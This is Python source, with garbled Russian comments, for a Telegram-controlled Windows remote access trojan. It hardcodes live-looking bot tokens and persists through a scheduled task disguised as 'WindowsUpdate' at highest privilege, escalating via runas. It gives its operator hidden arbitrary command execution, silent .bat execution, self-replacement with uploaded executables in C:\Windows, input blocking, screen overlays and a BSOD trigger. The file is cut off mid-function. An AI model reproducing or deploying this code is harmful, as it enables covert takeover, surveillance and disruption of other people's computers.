import telebot
import os
import psutil
import platform
import requests
import datetime
import winreg
import ctypes
import time
import cv2
import tkinter as tk
import customtkinter as ctk
from telebot import types
from PIL import Image, ImageTk
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL
from mss import mss
import pyautogui
import numpy as np
import wmi
import threading
import subprocess
import random
import traceback
import win32gui
import win32con
import win32api
import pyttsx3
import urllib.request
import sys
import pythoncom
from win10toast import ToastNotifier
import keyboard
import winsound

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –±–æ—Ç–∞
LOG_BOT_TOKEN = "7278721633:AAHT480CiCEe_Z5dfcY1UezGtYvM_MPtnvg"  # –¢–æ–∫–µ–Ω –±–æ—Ç–∞ –¥–ª—è –ª–æ–≥–æ–≤
log_bot = telebot.TeleBot(LOG_BOT_TOKEN)
PC_USERNAME = os.getlogin()  # –ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ü–ö
bot_token = "7842654231:AAHTQ5BoPsSyKIyhqbulpRNXE_zukRJd9lQ"
my_id = 5109649592
bot = telebot.TeleBot(bot_token)

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
current_folder = None
blocked_apps = set()
last_screenshot = None
mouse_sensitivity = 50
streaming = False
prank_active = False
prank_threads = []
chat_window = None
chat_active = False
overlay_window = None
sysinfo_running = False
input_blocked = False
block_windows_key = False
sound_playing = False


# –ü—Ä–æ–≤–µ—Ä–∫–∞ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
def check_id(message):
    return message.chat.id == my_id

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∞–≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def block_windows():
    global block_windows_key
    block_windows_key = True
    def on_windows_press(event):
        if block_windows_key and "windows" in event.name.lower() and event.event_type == keyboard.KEY_DOWN:
            # –ú–≥–Ω–æ–≤–µ–Ω–Ω–æ "–Ω–∞–∂–∏–º–∞–µ–º" –∫–ª–∞–≤–∏—à—É Windows, —á—Ç–æ–±—ã –æ—Ç–º–µ–Ω–∏—Ç—å –¥–µ–π—Å—Ç–≤–∏–µ
            keyboard.press("windows")
            keyboard.release("windows")
            return False  # –ë–ª–æ–∫–∏—Ä—É–µ–º –¥–∞–ª—å–Ω–µ–π—à—É—é –æ–±—Ä–∞–±–æ—Ç–∫—É
        return True
    keyboard.hook(on_windows_press)

def unblock_windows():
    global block_windows_key
    block_windows_key = False
    keyboard.unhook_all()  # –£–¥–∞–ª—è–µ–º –≤—Å–µ –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã

# –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫
def handle_error(e, context="–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ–ø–µ—Ä–∞—Ü–∏—è"):
    error_msg = f"[{PC_USERNAME}] –û—à–∏–±–∫–∞ –≤ {context}: {str(e)}\n{traceback.format_exc()}"
    print(error_msg)
    with open("error_log.txt", "a", encoding="utf-8") as f:
        f.write(f"{error_msg}\n{'='*50}\n")
    try:
        log_bot.send_message(my_id, error_msg)
    except Exception as log_error:
        print(f"–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –ª–æ–≥ –≤ –±–æ—Ç–∞: {log_error}")

# –°–æ–∑–¥–∞–Ω–∏–µ –∑–∞–¥–∞—á–∏ –≤ –ü–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫–µ –∑–∞–¥–∞—á –¥–ª—è –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞
def create_admin_task():
    try:
        task_name = "WindowsUpdate"
        script_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else sys.argv[0])
        script_path = script_path.replace('\\', '\\\\')
        cmd = (
            f'schtasks /create /tn "{task_name}" /tr "\\"{script_path}\\"" '
            f'/sc onlogon /rl highest /f'
        )
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='replace',
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        if result.returncode == 0:
            print("–ó–∞–¥–∞—á–∞ –≤ –ü–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫–µ –∑–∞–¥–∞—á —Å–æ–∑–¥–∞–Ω–∞.")
            return True
        else:
            stderr_output = result.stderr if result.stderr is not None else ""
            if "Access is denied" in stderr_output or "–û—Ç–∫–∞–∑–∞–Ω–æ –≤ –¥–æ—Å—Ç—É–ø–µ" in stderr_output:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/c {cmd}", None, 1)
                time.sleep(2)
                check_result = subprocess.run(
                    f'schtasks /query /tn "{task_name}"',
                    shell=True,
                    capture_output=True,
                    text=True,
                    encoding='utf-8',
                    errors='replace',
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                if check_result.returncode == 0:
                    print("–ó–∞–¥–∞—á–∞ —Å–æ–∑–¥–∞–Ω–∞ —Å –ø–æ–≤—ã—à–µ–Ω–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏.")
                    return True
                else:
                    handle_error(f"–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å –∑–∞–¥–∞—á—É –ø–æ—Å–ª–µ runas: {check_result.stderr}", "—Å–æ–∑–¥–∞–Ω–∏–∏ –∑–∞–¥–∞—á–∏ —Å –ø–æ–≤—ã—à–µ–Ω–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏")
                    return False
            else:
                handle_error(f"–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å –∑–∞–¥–∞—á—É: {stderr_output}", "—Å–æ–∑–¥–∞–Ω–∏–∏ –∑–∞–¥–∞—á–∏ –≤ –ü–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫–µ –∑–∞–¥–∞—á")
                return False
    except Exception as e:
        handle_error(e, "—Å–æ–∑–¥–∞–Ω–∏–∏ –∑–∞–¥–∞—á–∏ –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞")
        return False

def check_and_create_task():
    while True:
        try:
            result = subprocess.run(
                'schtasks /query /tn "TelegramBotAdminTask"',
                shell=True,
                capture_output=True,
                text=True,
                encoding='utf-8',
                errors='replace',
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            if result.returncode != 0:
                print("–ó–∞–¥–∞—á–∞ –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞. –ü—ã—Ç–∞—é—Å—å —Å–æ–∑–¥–∞—Ç—å...")
                if create_admin_task():
                    break
            else:
                print("–ó–∞–¥–∞—á–∞ –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞ —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç.")
                break
        except Exception as e:
            handle_error(e, "–ø—Ä–æ–≤–µ—Ä–∫–µ –∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –∑–∞–¥–∞—á–∏ –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞")
        time.sleep(10)

# –°–æ–∑–¥–∞–Ω–∏–µ –±–ª–æ–∫–∏—Ä—É—é—â–µ–≥–æ –æ–∫–Ω–∞
def create_overlay():
    global overlay_window
    try:
        if overlay_window:
            win32gui.DestroyWindow(overlay_window)
        overlay_window = win32gui.CreateWindowEx(
            win32con.WS_EX_TOPMOST | win32con.WS_EX_TRANSPARENT,
            "STATIC", "Overlay", win32con.WS_POPUP,
            0, 0, win32api.GetSystemMetrics(0), win32api.GetSystemMetrics(1),
            0, 0, 0, None
        )
        win32gui.ShowWindow(overlay_window, win32con.SW_SHOW)
        win32gui.UpdateWindow(overlay_window)
    except Exception as e:
        handle_error(e, "—Å–æ–∑–¥–∞–Ω–∏–∏ –±–ª–æ–∫–∏—Ä—É—é—â–µ–≥–æ –æ–∫–Ω–∞")

def destroy_overlay():
    global overlay_window
    try:
        if overlay_window:
            win32gui.DestroyWindow(overlay_window)
            overlay_window = None
    except Exception as e:
        handle_error(e, "—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–∏ –±–ª–æ–∫–∏—Ä—É—é—â–µ–≥–æ –æ–∫–Ω–∞")

# –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é
@bot.message_handler(commands=['start'])
def send_welcome(message):
    try:
        if not check_id(message):
            bot.send_message(my_id, f"–ö—Ç–æ-—Ç–æ (ID: {message.chat.id}) –ø—ã—Ç–∞–ª—Å—è –∑–∞–ø—É—Å—Ç–∏—Ç—å –±–æ—Ç–∞!")
            return
        username = os.getlogin()
        bot.send_message(my_id, f"–ó–∞–ø—É—â–µ–Ω–æ {username}")
        show_main_menu(message)
    except Exception as e:
        handle_error(e, "–∑–∞–ø—É—Å–∫–µ –±–æ—Ç–∞")

def show_main_menu(message):
    try:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("üì∑ –°–∫—Ä–∏–Ω—à–æ—Ç—ã", "üìπ –í–µ–±-–∫–∞–º–µ—Ä–∞", "üñ± –ú—ã—à–∫–∞")
        markup.add("üìÇ –§–∞–π–ª—ã", "üñ• –°–∏—Å—Ç–µ–º–∞", "üì∫ –ü—Ä–æ—Ü–µ—Å—Å—ã")
        markup.add("üîß –ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞", "üì© –£–≤–µ–¥–æ–º–ª–µ–Ω–∏—è", "üîä –ì—Ä–æ–º–∫–æ—Å—Ç—å")
        markup.add("üì° –°—Ç—Ä–∏–º–∏–Ω–≥", "üéâ –í–µ—Å–µ–ª—å–µ", "üìú –°—Ü–µ–Ω–∞—Ä–∏–∏")
        markup.add("üí¨ –ß–∞—Ç", "‚öôÔ∏è –ê–¥–º–∏–Ω", "üí• BSOD")
        bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "–æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –≥–ª–∞–≤–Ω–æ–≥–æ –º–µ–Ω—é")

# –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ü–ö
@bot.message_handler(func=lambda message: message.text == "–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ü–ö")
def control_pc_menu(message):
    try:
        if not check_id(message):
            return
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("–í—ã–∫–ª—é—á–∏—Ç—å –ü–ö", "–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö", "–ì–∏–±–µ—Ä–Ω–∞—Ü–∏—è")
        markup.add("–í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É", "–û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É", "–ó–∞–ø—É—Å—Ç–∏—Ç—å .bat")
        markup.add("‚¨ÖÔ∏è –ù–∞–∑–∞–¥")
        bot.send_message(message.chat.id, "–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ü–ö:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "–º–µ–Ω—é —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ü–ö")

@bot.message_handler(func=lambda message: message.text in ["–í—ã–∫–ª—é—á–∏—Ç—å –ü–ö", "–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö", "–ì–∏–±–µ—Ä–Ω–∞—Ü–∏—è"])
def power_control(message):
    try:
        if not check_id(message):
            return
        action = message.text
        if action == "–í—ã–∫–ª—é—á–∏—Ç—å –ü–ö":
            subprocess.run("shutdown /s /t 0", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            bot.send_message(message.chat.id, "–ü–ö –≤—ã–∫–ª—é—á–∞–µ—Ç—Å—è...")
        elif action == "–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö":
            subprocess.run("shutdown /r /t 0", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            bot.send_message(message.chat.id, "–ü–ö –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è...")
        elif action == "–ì–∏–±–µ—Ä–Ω–∞—Ü–∏—è":
            subprocess.run("shutdown /h", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            bot.send_message(message.chat.id, "–ü–ö –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç –≤ —Ä–µ–∂–∏–º –≥–∏–±–µ—Ä–Ω–∞—Ü–∏–∏...")
    except Exception as e:
        handle_error(e, "—É–ø—Ä–∞–≤–ª–µ–Ω–∏–∏ –ø–∏—Ç–∞–Ω–∏–µ–º –ü–ö")

@bot.message_handler(func=lambda message: message.text == "–í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É")
def execute_command(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å—Ç–µ –∫–æ–º–∞–Ω–¥—É –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è (–Ω–∞–ø—Ä–∏–º–µ—Ä, dir):")
        bot.register_next_step_handler(message, process_command)
    except Exception as e:
        handle_error(e, "–ø–æ–¥–≥–æ—Ç–æ–≤–∫–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã")

def process_command(message):
    try:
        if not check_id(message):
            return
        command = message.text
        result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding='utf-8', errors='replace', creationflags=subprocess.CREATE_NO_WINDOW)
        output = result.stdout or result.stderr or "–ö–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞, –Ω–æ –≤—ã–≤–æ–¥–∞ –Ω–µ—Ç."
        bot.send_message(message.chat.id, f"–†–µ–∑—É–ª—å—Ç–∞—Ç:\n{output[:4000]}")
    except Exception as e:
        handle_error(e, "–≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –∫–æ–º–∞–Ω–¥—ã")

@bot.message_handler(func=lambda message: message.text == "–û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É")
def open_link(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å—Ç–µ URL –¥–ª—è –æ—Ç–∫—Ä—ã—Ç–∏—è (–Ω–∞–ø—Ä–∏–º–µ—Ä, https://example.com):")
        bot.register_next_step_handler(message, process_link)
    except Exception as e:
        handle_error(e, "–ø–æ–¥–≥–æ—Ç–æ–≤–∫–µ –æ—Ç–∫—Ä—ã—Ç–∏—è —Å—Å—ã–ª–∫–∏")

def process_link(message):
    try:
        if not check_id(message):
            return
        url = message.text
        if not url.startswith("http"):
            url = "http://" + url
        subprocess.run(f'start {url}', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        bot.send_message(message.chat.id, f"–°—Å—ã–ª–∫–∞ {url} –æ—Ç–∫—Ä—ã—Ç–∞.")
    except Exception as e:
        handle_error(e, "–æ—Ç–∫—Ä—ã—Ç–∏–∏ —Å—Å—ã–ª–∫–∏")

@bot.message_handler(content_types=['document'], func=lambda message: message.document.file_name.endswith(".bat"))
def handle_bat_file(message):
    try:
        if not check_id(message):
            return
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        bat_path = f"temp_{message.document.file_name}"
        with open(bat_path, "wb") as f:
            f.write(downloaded_file)
        subprocess.run(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        bot.send_message(message.chat.id, f"–§–∞–π–ª {message.document.file_name} –∑–∞–ø—É—â–µ–Ω —Å–∫—Ä—ã—Ç–Ω–æ.")
        os.remove(bat_path)
    except Exception as e:
        handle_error(e, "–∑–∞–ø—É—Å–∫–µ .bat —Ñ–∞–π–ª–∞")

# –ê–¥–º–∏–Ω –º–µ–Ω—é
@bot.message_handler(func=lambda message: message.text == "‚öôÔ∏è –ê–¥–º–∏–Ω")
def admin_menu(message):
    try:
        if not check_id(message):
            return
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("üîÑ –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫", "üîÑ –û–±–Ω–æ–≤–∏—Ç—å –±–æ—Ç–∞")
        markup.add("–í—ã–∫–ª—é—á–∏—Ç—å –ü–ö", "–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö")
        markup.add("–°–∫—Ä—ã—Ç–∞—è –∫–æ–º–∞–Ω–¥–∞", "–û–±—ã—á–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞", "–û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É")
        markup.add("–ù–∞–∑–∞–¥")
        bot.send_message(message.chat.id, "–ê–¥–º–∏–Ω –º–µ–Ω—é:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "–º–µ–Ω—é –∞–¥–º–∏–Ω–∞")

@bot.message_handler(func=lambda message: message.text == "–í—ã–∫–ª—é—á–∏—Ç—å –ü–ö")
def shutdown_pc(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("–î–∞", callback_data="shutdown_yes"))
        markup.add(types.InlineKeyboardButton("–ù–µ—Ç", callback_data="shutdown_no"))
        bot.send_message(message.chat.id, "–í—ã —É–≤–µ—Ä–µ–Ω—ã, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –≤—ã–∫–ª—é—á–∏—Ç—å –ü–ö?", reply_markup=markup)
    except Exception as e:
        handle_error(e, "–≤—ã–∫–ª—é—á–µ–Ω–∏–∏ –ü–ö")

@bot.message_handler(func=lambda message: message.text == "–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö")
def reboot_pc(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("–î–∞", callback_data="reboot_yes"))
        markup.add(types.InlineKeyboardButton("–ù–µ—Ç", callback_data="reboot_no"))
        bot.send_message(message.chat.id, "–í—ã —É–≤–µ—Ä–µ–Ω—ã, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö?", reply_markup=markup)
    except Exception as e:
        handle_error(e, "–ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–µ –ü–ö")

@bot.message_handler(func=lambda message: message.text == "–°–∫—Ä—ã—Ç–∞—è –∫–æ–º–∞–Ω–¥–∞")
def hidden_command(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å—Ç–µ –∫–æ–º–∞–Ω–¥—É –¥–ª—è —Å–∫—Ä—ã—Ç–æ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è (–Ω–∞–ø—Ä–∏–º–µ—Ä, dir):")
        bot.register_next_step_handler(message, process_hidden_command)
    except Exception as e:
        handle_error(e, "–ø–æ–¥–≥–æ—Ç–æ–≤–∫–µ —Å–∫—Ä—ã—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã")

def process_hidden_command(message):
    try:
        if not check_id(message):
            return
        command = message.text
        subprocess.run(command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        bot.send_message(message.chat.id, "–ö–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ —Å–∫—Ä—ã—Ç–Ω–æ.")
    except Exception as e:
        handle_error(e, "–≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ —Å–∫—Ä—ã—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã")

@bot.message_handler(func=lambda message: message.text == "–û–±—ã—á–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞")
def normal_command(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å—Ç–µ –∫–æ–º–∞–Ω–¥—É –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è (–Ω–∞–ø—Ä–∏–º–µ—Ä, dir):")
        bot.register_next_step_handler(message, process_normal_command)
    except Exception as e:
        handle_error(e, "–ø–æ–¥–≥–æ—Ç–æ–≤–∫–µ –æ–±—ã—á–Ω–æ–π –∫–æ–º–∞–Ω–¥—ã")

def process_normal_command(message):
    try:
        if not check_id(message):
            return
        command = message.text
        result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding='utf-8', errors='replace')
        output = result.stdout or result.stderr or "–ö–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞, –Ω–æ –≤—ã–≤–æ–¥–∞ –Ω–µ—Ç."
        bot.send_message(message.chat.id, f"–†–µ–∑—É–ª—å—Ç–∞—Ç:\n{output[:4000]}")
    except Exception as e:
        handle_error(e, "–≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –æ–±—ã—á–Ω–æ–π –∫–æ–º–∞–Ω–¥—ã")

@bot.message_handler(func=lambda message: message.text == "–û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É")
def open_link(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å—Ç–µ URL –¥–ª—è –æ—Ç–∫—Ä—ã—Ç–∏—è (–Ω–∞–ø—Ä–∏–º–µ—Ä, https://example.com):")
        bot.register_next_step_handler(message, process_link)
    except Exception as e:
        handle_error(e, "–ø–æ–¥–≥–æ—Ç–æ–≤–∫–µ –æ—Ç–∫—Ä—ã—Ç–∏—è —Å—Å—ã–ª–∫–∏")

def process_link(message):
    try:
        if not check_id(message):
            return
        url = message.text
        if not url.startswith("http"):
            url = "http://" + url
        subprocess.run(f'start {url}', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        bot.send_message(message.chat.id, f"–°—Å—ã–ª–∫–∞ {url} –æ—Ç–∫—Ä—ã—Ç–∞.")
    except Exception as e:
        handle_error(e, "–æ—Ç–∫—Ä—ã—Ç–∏–∏ —Å—Å—ã–ª–∫–∏")

@bot.message_handler(func=lambda message: message.text == "üîÑ –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫")
def restart_bot(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("–î–∞", callback_data="restart_yes"))
        markup.add(types.InlineKeyboardButton("–ù–µ—Ç", callback_data="restart_no"))
        bot.send_message(message.chat.id, "–í—ã —É–≤–µ—Ä–µ–Ω—ã, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç—å –±–æ—Ç–∞?", reply_markup=markup)
    except Exception as e:
        handle_error(e, "–ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–µ –±–æ—Ç–∞")

@bot.message_handler(func=lambda message: message.text == "üîÑ –û–±–Ω–æ–≤–∏—Ç—å –±–æ—Ç–∞")
def update_bot(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("–î–∞", callback_data="update_yes"))
        markup.add(types.InlineKeyboardButton("–ù–µ—Ç", callback_data="update_no"))
        bot.send_message(message.chat.id, "–í—ã —É–≤–µ—Ä–µ–Ω—ã, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –æ–±–Ω–æ–≤–∏—Ç—å –±–æ—Ç–∞? –û—Ç–ø—Ä–∞–≤—å—Ç–µ –Ω–æ–≤—ã–π .exe —Ñ–∞–π–ª –ø–æ—Å–ª–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è.", reply_markup=markup)
    except Exception as e:
        handle_error(e, "–æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ –±–æ—Ç–∞")

@bot.callback_query_handler(func=lambda call: call.data in ["restart_yes", "restart_no", "update_yes", "update_no"])
def confirm_action(call):
    try:
        if call.data == "restart_yes":
            bot.send_message(call.message.chat.id, "–ü–µ—Ä–µ–∑–∞–ø—É—Å–∫ –±–æ—Ç–∞...")
            print(f"–ü–µ—Ä–µ–∑–∞–ø—É—Å–∫: sys.executable={sys.executable}, argv[0]={sys.argv[0]}")
            subprocess.Popen([sys.executable, sys.argv[0]])
            time.sleep(1)
            os._exit(0)
        elif call.data == "restart_no":
            bot.send_message(call.message.chat.id, "–ü–µ—Ä–µ–∑–∞–ø—É—Å–∫ –æ—Ç–º–µ–Ω—ë–Ω")
            bot.answer_callback_query(call.id)
        elif call.data == "update_yes":
            bot.send_message(call.message.chat.id, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –Ω–æ–≤—ã–π .exe —Ñ–∞–π–ª –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –±–æ—Ç–∞.")
            bot.register_next_step_handler(call.message, process_update_file)
        elif call.data == "update_no":
            bot.send_message(call.message.chat.id, "–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ")
            bot.answer_callback_query(call.id)
    except Exception as e:
        handle_error(e, "–ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–∏ –¥–µ–π—Å—Ç–≤–∏—è")

def process_update_file(message):
    try:
        if not check_id(message) or not message.document or not message.document.file_name.endswith(".exe"):
            bot.send_message(message.chat.id, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–π .exe —Ñ–∞–π–ª.")
            return

        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        new_exe_path = os.path.join("C:\\Windows", message.document.file_name)

        with open(new_exe_path, "wb") as f:
            f.write(downloaded_file)

        subprocess.run('schtasks /delete /tn "TelegramBotAdminTask" /f', shell=True, capture_output=True, text=True)
        cmd = (
            f'schtasks /create /tn "TelegramBotAdminTask" /tr "\\"{new_exe_path}\\"" '
            f'/sc onlogon /rl highest /f'
        )
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"–û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è –∑–∞–¥–∞—á–∏: {result.stderr}")

        bot.send_message(message.chat.id, f"–ù–æ–≤–∞—è –≤–µ—Ä—Å–∏—è –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–∞: {new_exe_path}. –ó–∞–ø—É—Å–∫–∞—é...")
        result = subprocess.run('schtasks /run /tn "TelegramBotAdminTask"', shell=True, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"–û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ –∑–∞–¥–∞—á–∏: {result.stderr}")

        bot.send_message(message.chat.id, "–¢–µ–∫—É—â–∞—è –≤–µ—Ä—Å–∏—è –∑–∞–≤–µ—Ä—à–∞–µ—Ç —Ä–∞–±–æ—Ç—É.")
        time.sleep(1)
        os._exit(0)

    except Exception as e:
        handle_error(e, "–æ–±—Ä–∞–±–æ—Ç–∫–µ —Ñ–∞–π–ª–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è")
        bot.send_message(message.chat.id, "–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ –±–æ—Ç–∞. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ª–æ–≥.")





@bot.callback_query_handler(func=lambda call: call.data in ["shutdown_yes", "shutdown_no", "reboot_yes", "reboot_no"])
def confirm_power_action(call):
    try:
        if call.data == "shutdown_yes":
            bot.send_message(call.message.chat.id, "–ü–ö –≤—ã–∫–ª—é—á–∞–µ—Ç—Å—è...")
            subprocess.run("shutdown /s /t 0", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            bot.answer_callback_query(call.id)
        elif call.data == "shutdown_no":
            bot.send_message(call.message.chat.id, "–í—ã–∫–ª—é—á–µ–Ω–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ")
            bot.answer_callback_query(call.id)
        elif call.data == "reboot_yes":
            bot.send_message(call.message.chat.id, "–ü–ö –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è...")
            subprocess.run("shutdown /r /t 0", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            bot.answer_callback_query(call.id)
        elif call.data == "reboot_no":
            bot.send_message(call.message.chat.id, "–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞")
            bot.answer_callback_query(call.id)
    except Exception as e:
        handle_error(e, "–ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–∏ –¥–µ–π—Å—Ç–≤–∏—è –ø–∏—Ç–∞–Ω–∏—è")

# BSOD
@bot.message_handler(func=lambda message: message.text == "üí• BSOD")
def bsod_menu(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("–í—ã–∑–≤–∞—Ç—å BSOD", callback_data="bsod_yes"))
